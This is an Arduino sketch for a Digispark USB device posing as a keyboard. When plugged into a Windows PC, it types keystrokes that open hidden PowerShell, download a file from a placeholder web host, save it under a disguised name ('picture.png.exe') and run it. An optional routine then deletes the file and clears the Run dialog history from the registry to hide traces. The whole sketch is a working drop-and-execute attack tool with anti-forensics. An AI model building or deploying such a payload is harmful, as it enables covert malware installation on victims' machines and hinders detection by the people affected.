#include <DigiKeyboard.h>


//Modify those values:
//Modify this according to your target machine's strength. Usually 100 (0.1 sec) is enough for fast machines, 3000 (3.0 sec) for slow machines.
const int waitForPowershellDelay = 3000;

//Full path of the script download location
const char scriptFileLocationPath[] = "C:\\Users\\$env:username\\picture.png.exe";

//Full address of the file on the web server.
const char hostFilePath[] = "http://host/file";

void setup() {
  //Init
  pinMode(1, OUTPUT);
  DigiKeyboard.update();

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(10);

  //Start proccess
  
  //WINDOWS + R open run.exe
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);

  //Run powershell in hidden mode using run.exe with the command to download the file (script) and execute it
  DigiKeyboard.print("powershell -windowstyle hidden -Command \"Invoke-WebRequest -Uri ");
  DigiKeyboard.print(hostFilePath);
  DigiKeyboard.print(" -OutFile ");
  DigiKeyboard.print(scriptFileLocationPath);
  DigiKeyboard.print("; Invoke-Item ");
  DigiKeyboard.print(scriptFileLocationPath);
  DigiKeyboard.println(";\"");

  //Optional: Uncomment to delete the downloaded file and run history after executing the script.
  //Parameter: The time that will take for your script to be finished
  //deleteFileAndRunHistory(5000);
}

void loop() {
  //Start blinking fast after script was executed - you MAY unplug the device now.
  //On
  digitalWrite(1, HIGH);
  DigiKeyboard.delay(50);
  //Off
  digitalWrite(1, LOW);
  DigiKeyboard.delay(50);
}

//Parameter: The time that will take for your script to be finished
void deleteFileAndRunHistory(int scriptExecuteTime)
{
  DigiKeyboard.delay(scriptExecuteTime);
  
  //WINDOWS + R open run.exe
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(50);
  
  //Run powershell in hidden mode using run.exe with the command to delete the file and run history
  DigiKeyboard.print("powershell -windowstyle hidden -Command \"Remove-Item \"");
  DigiKeyboard.print(scriptFileLocationPath);
  DigiKeyboard.println("\";reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f;\"");
}
